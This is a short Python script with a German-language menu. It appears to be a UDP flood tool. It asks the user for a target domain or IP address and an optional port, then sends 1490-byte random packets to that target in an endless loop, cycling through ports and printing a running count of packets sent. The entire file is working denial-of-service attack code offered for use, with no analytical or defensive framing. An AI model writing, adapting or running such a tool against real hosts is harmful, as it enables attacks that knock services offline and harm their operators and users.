# -*- coding: utf-8 -*-
import os
import time
import random
import socket
from platform import system
from tqdm.auto import tqdm

uname = system()
cmd_clear = 'cls' if uname == "Windows" else 'clear'
os.system(cmd_clear)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

while True:
    print("")
    print("\033[92;1m")
    print("1. Website-Domain\n2. IP-Adresse\n3. Beenden")
    print('\033[0m')

    opt = str(input("\n> "))

    if opt == '1':
        domain = str(input("Domain: "))
        ip = socket.gethostbyname(domain)
        break

    elif opt == '2':
        ip = str(input("IP-Adresse: "))
        break

    elif opt == '3':
        exit()

    else:
        print('\033[91mUngültige Auswahl!\033[0m')
        time.sleep(2)
        os.system(cmd_clear)

port_mode = False 
port = 2

while 1:
    port_bool = str(input("Bestimmter Port? [j/n]: "))

    if port_bool.lower() == "j":
        port_mode = True
        port = int(input("Port: "))
        break

    elif port_bool.lower() == "n":
        break

    else:
        print('\033[91mUngültige Auswahl!\033[0m')

os.system(cmd_clear)
print('\033[36;2mINITIALISIEREN....')
time.sleep(1)
print('START...')
time.sleep(4)

sent = 0

if not port_mode: 
    try:
        while True:
            if port == 65534:
                port = 1

            elif port == 1900:
                port = 1901

            sock.sendto(bytes, (ip, port))
            sent += 1
            port += 1
            print("\033[32;1mGesendet %s Pakete an %s durch Port:%s" % (sent, ip, port))
    except Exception:
        print('\n\033[31;1mBeendet\033[0m')

else:  
    if port < 2:
        port = 2

    elif port == 65534:
        port = 2

    elif port == 1900:
        port = 1901

    try:
        while True:
            sock.sendto(bytes, (ip, port))
            sent += 1
            print("\033[32;1mGesendet %s Pakete an %s durch Port:%s" % (sent, ip, port))
    except Exception:
        print('\n\033[31;1mBeendet\033[0m')
